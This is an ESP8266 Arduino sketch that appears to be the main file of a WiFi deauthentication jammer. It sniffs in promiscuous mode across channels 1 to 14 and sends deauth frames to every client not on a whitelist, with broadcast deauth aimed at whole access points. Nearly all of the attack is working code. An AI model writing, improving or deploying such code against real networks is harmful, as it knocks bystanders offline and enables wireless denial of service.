// Expose Espressif SDK functionality - wrapped in ifdef so that it still
// compiles on other platforms
#ifdef ESP8266
extern "C" {
#include "user_interface.h"
}
#endif

#include <ESP8266WiFi.h>
#include "utils.h"
#include "madWifi.h"
#include "ledBreathe.h"


void setup() {
    Serial.begin(115200);
    Serial.printf("\n\nSDK version:%s\n", system_get_sdk_version());

    // Promiscuous works only with station mode
    wifi_set_opmode(STATION_MODE);

    // Set up promiscuous callback
    wifi_set_channel(1);
    wifi_promiscuous_enable(0);
    wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_enable(1);
}

void loop()
{
    while (true)
    {
        ledBreathe(D0);



        channel = 1;
        wifi_set_channel(channel);
        while (true)
        {
            nothing_new++;
            if (nothing_new > 200)
            {
                nothing_new = 0;

                wifi_promiscuous_enable(0);
                wifi_set_promiscuous_rx_cb(0);
                wifi_promiscuous_enable(1);
                for (int ua = 0; ua < aps_known_count; ua++) {
                    if (aps_known[ua].channel == channel) {
                        for (int uc = 0; uc < clients_known_count; uc++) {
                            if (! memcmp(aps_known[ua].bssid, clients_known[uc].bssid, ETH_MAC_LEN)) {
#ifdef WHITELIST_STATION
                                address_to_check = clients_known[uc].station;
#else
                                address_to_check = clients_known[uc].ap;
#endif
                                if (check_whitelist(address_to_check)) {
                                    friendly_device_found = true;
                                    Serial.print("Whitelisted -->");
                                    print_client(clients_known[uc]);
                                } else {
                                    Serial.print("DeAuth to ---->");
                                    print_client(clients_known[uc]);
                                    deauth(clients_known[uc].station, clients_known[uc].bssid, clients_known[uc].seq_n);
                                }
                                break;
                            }
                        }
                        if (!friendly_device_found) deauth(broadcast2, aps_known[ua].bssid, 128);
                        friendly_device_found = false;
                    }
                }
                wifi_promiscuous_enable(0);
                wifi_set_promiscuous_rx_cb(promisc_cb);
                wifi_promiscuous_enable(1);

                channel++;
                if (channel == 15) break;
                wifi_set_channel(channel);
            }
            delay(1);

            if ((Serial.available() > 0) && (Serial.read() == '\n')) {
                Serial.println("\n-------------------------------------------------------------------------\n");
                for (int u = 0; u < aps_known_count; u++) print_beacon(aps_known[u]);
                for (int u = 0; u < clients_known_count; u++) print_client(clients_known[u]);
                Serial.println("\n-------------------------------------------------------------------------\n");
            }
        }
    }
}

